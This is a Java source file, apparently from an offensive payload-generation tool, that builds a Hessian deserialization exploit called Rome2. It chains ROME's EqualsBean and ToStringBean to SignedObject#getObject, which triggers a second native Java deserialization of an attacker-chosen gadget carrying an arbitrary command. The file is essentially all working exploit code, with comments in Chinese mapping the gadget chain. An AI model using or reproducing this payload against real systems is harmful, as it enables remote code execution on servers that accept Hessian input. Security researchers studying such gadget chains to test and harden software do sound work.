package cn.butler.hessian.payloads;


import cn.butler.payloads.ObjectPayload;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import cn.butler.hessian.util.UtilFactory;
import cn.butler.yso.payloads.util.Reflections;

import java.io.Serializable;
import java.security.*;

/**
 * Hessian Rome 打二次反序列化
 * HashMap#put()
 *   --HashMap#hash()
 *      --EqualsBean#hashCode()
 *          --EqualsBean#beanHashCode()
 *             --ToStringBean#toString()
 *     	   --ToStringBean#toString(final String prefix)
 *             --SignedObject#getObject()
 * Xxxx#readObject()
 */
public class Rome2 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        //Java原生反序列化Gadget
        String[] parts = command.split(":", 2);
        String gadget = parts[0];
        String payload = parts[1];
        Object javaGadget = ObjectPayload.Utils.makePayloadObject("YsoAttack",gadget, payload);
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        KeyPair keyPair = keyPairGenerator.generateKeyPair();
        PrivateKey aPrivate = keyPair.getPrivate();
        Signature signature = Signature.getInstance("MD5withRSA");
        //Hessian反序列化Gadget
        SignedObject signedObject = new SignedObject((Serializable) javaGadget,aPrivate,signature);
        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class,signedObject);
        EqualsBean equalsBean = new EqualsBean(String.class,"123");
        Reflections.setFieldValue(equalsBean,"_beanClass",ToStringBean.class);
        Reflections.setFieldValue(equalsBean,"_obj",toStringBean1);
        //构造HashMap触发点
        Object object = UtilFactory.makeHashCodeTrigger(equalsBean);
//        HashMap hashMap = new HashMap();
//        hashMap.put(equalsBean,"1");
        //serialize(hashMap);
//        unserialize("hf.ser");
        //hashmap -- equalsBean -- toStringBean
        return object;
    }

    public static void main(String[] args) {

    }
}
